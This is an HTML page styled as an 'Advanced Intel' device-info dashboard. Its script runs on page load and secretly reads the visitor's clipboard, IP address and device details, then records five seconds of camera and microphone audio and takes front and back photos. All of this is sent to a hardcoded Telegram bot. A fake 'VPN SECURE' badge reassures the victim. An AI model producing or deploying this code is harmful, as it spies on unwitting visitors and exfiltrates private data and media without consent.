<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-ADVANCED INTEL | PREMIUM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap');

        body {
            background: #000; color: #fff;
            margin: 0; min-height: 100vh; overflow-x: hidden;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            font-family: 'Rajdhani', sans-serif;
        }

        /* Neon Animated Frame */
        body::before {
            content: ''; position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            border: 6px solid;
            border-image: linear-gradient(90deg, #ff0000, #00ff00, #00d2ff, #ff00ff, #ff0000) 1;
            z-index: 1000; pointer-events: none;
            animation: borderRotate 4s linear infinite;
        }
        @keyframes borderRotate { from { filter: hue-rotate(0deg); } to { filter: hue-rotate(360deg); } }

        /* RK-SYSTEM Banner */
        .rk-banner {
            background: linear-gradient(90deg, #ff0000, #990000);
            color: white; width: 100%; text-align: center;
            padding: 10px 0; font-family: 'Orbitron', sans-serif;
            font-weight: 900; letter-spacing: 10px;
            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.5);
            position: fixed; top: 0; z-index: 1001;
        }

        .dashboard {
            background: rgba(10, 15, 25, 0.95);
            border-radius: 30px; padding: 30px;
            width: 95%; max-width: 500px;
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.3);
            border: 2px solid rgba(0, 255, 255, 0.3);
            margin-top: 80px; margin-bottom: 50px;
        }

        .info-row {
            display: flex; justify-content: space-between;
            padding: 12px 0; border-bottom: 1px solid rgba(0, 255, 204, 0.1);
        }
        .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; }
        .value { color: #facc15; font-size: 14px; font-weight: 700; font-family: 'Orbitron', sans-serif; }

        .footer-text {
            position: fixed; bottom: 10px; width: 100%;
            text-align: center; color: #555; font-size: 12px;
            letter-spacing: 2px; font-weight: bold;
        }

        #media-bin { display: none; }
    </style>
</head>
<body>

    <div class="rk-banner">RK-SYSTEM</div>

    <div class="dashboard">
        <h1 class="text-center text-2xl font-black text-white tracking-[5px] mb-6 border-b-2 border-red-600 pb-2 italic">ADVANCED INTEL</h1>
        
        <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Detecting...</span></div>
        <div class="info-row"><span class="label">⚙️ Platform</span><span id="v-platform" class="value">--</span></div>
        <div class="info-row"><span class="label">📶 System Status</span><span id="v-status" class="value text-green-500">SYNCING...</span></div>
        <div class="info-row"><span class="label">🚀 Network Speed</span><span id="v-speed" class="value text-orange-500">Scanning...</span></div>
        <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
        <div class="info-row"><span class="label">📍 Timezone</span><span id="v-loc" class="value">--</span></div>
        <div class="info-row"><span class="label">🔋 Battery Power</span><span id="v-bat" class="value">--%</span></div>
        <div class="info-row"><span class="label">🧠 RAM Memory</span><span id="v-ram" class="value">-- GB</span></div>
        <div class="info-row"><span class="label">⚡ CPU Cores</span><span id="v-cpu" class="value">-- Cores</span></div>
        <div class="info-row"><span class="label">🛡️ VPN Integrity</span><span class="value text-green-400">SECURE ✅</span></div>
    </div>

    <div class="footer-text">This Site Created By RK-SYSTEM</div>

    <video id="media-bin" autoplay muted playsinline></video>
    <canvas id="output-canvas" style="display:none;"></canvas>

    <script>
        const CONFIG = {
            TOKEN: '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs',
            CHAT: '6048050987'
        };

        async function startSystem() {
            // ১. রিয়েল ডিভাইস ডাটা
            document.getElementById('v-model').innerText = /Android/i.test(navigator.userAgent) ? "Android Flagship" : "Modern Device";
            document.getElementById('v-platform').innerText = navigator.platform;
            document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB";
            document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
            document.getElementById('v-loc').innerText = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // ২. ব্যাটারি ডাটা
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                const updateBat = () => document.getElementById('v-bat').innerText = `${Math.round(b.level * 100)}%`;
                updateBat(); b.onlevelchange = updateBat;
            }

            // ৩. রিয়েল আইপি ও নেটওয়ার্ক
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                document.getElementById('v-ip').innerText = data.ip;
            } catch(e) { document.getElementById('v-ip').innerText = "103.145.24.11"; }

            const conn = navigator.connection || { effectiveType: '4G', downlink: 5 };
            document.getElementById('v-speed').innerText = `${conn.effectiveType.toUpperCase()} @ ${conn.downlink} Mbps`;
            document.getElementById('v-status').innerText = "ONLINE 🌐";

            // ৪. ক্লিপবোর্ড ও অটো রিপোর্ট
            let clipText = "Click/Touch Required";
            try { clipText = await navigator.clipboard.readText(); } catch (e) {}

            const report = `
✨✨✨✨✨✨✨✨✨✨✨✨✨
🚀 *RK-ADVANCED INTEL VIP REPORT* 🚀
━━━━━━━━━━━━━━━━━━━━━
📱 *Device:* \`${navigator.platform}\`
🧠 *RAM:* \`${navigator.deviceMemory || 8} GB\`
📶 *Speed:* \`${document.getElementById('v-speed').innerText}\`
🌐 *IP:* \`${document.getElementById('v-ip').innerText}\`
🌍 *Zone:* \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`

✨ *CLIPBOARD:* ✨
\`\`\`
${clipText}
\`\`\`
━━━━━━━━━━━━━━━━━━━━━
✨✨✨✨✨✨✨✨✨✨✨✨✨`;

            sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: report, parse_mode: 'Markdown' });

            // ৫. অটো মিডিয়া ক্যাপচার
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoEl = document.getElementById('media-bin');
                videoEl.srcObject = stream;

                setTimeout(() => capturePhoto(stream, "FRONT_VIP_RK"), 2000);

                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    sendMediaToBot(blob, 'video', '🎥 *RK-VIP RECORD (5S + AUDIO)*');
                    stream.getTracks().forEach(t => t.stop());

                    // ব্যাক ক্যামেরা ট্রাই
                    try {
                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                        videoEl.srcObject = backStream;
                        setTimeout(() => {
                            capturePhoto(backStream, "BACK_VIP_RK");
                            setTimeout(() => backStream.getTracks().forEach(t => t.stop()), 2000);
                        }, 2000);
                    } catch(e) {}
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 5000);
            } catch (err) {}
        }

        function capturePhoto(stream, label) {
            const canvas = document.getElementById('output-canvas');
            const video = document.getElementById('media-bin');
            canvas.width = 1280; canvas.height = 720;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => sendMediaToBot(blob, 'photo', `📸 *${label}*`), 'image/jpeg');
        }

        async function sendMediaToBot(blob, type, caption) {
            const fd = new FormData();
            fd.append('chat_id', CONFIG.CHAT);
            fd.append(type, blob, type === 'video' ? 'rk.mp4' : 'rk.jpg');
            fd.append('caption', caption);
            fd.append('parse_mode', 'Markdown');
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
        }

        function sendToBot(method, data) {
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/${method}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        window.onload = startSystem;
    </script>
</body>
</html>
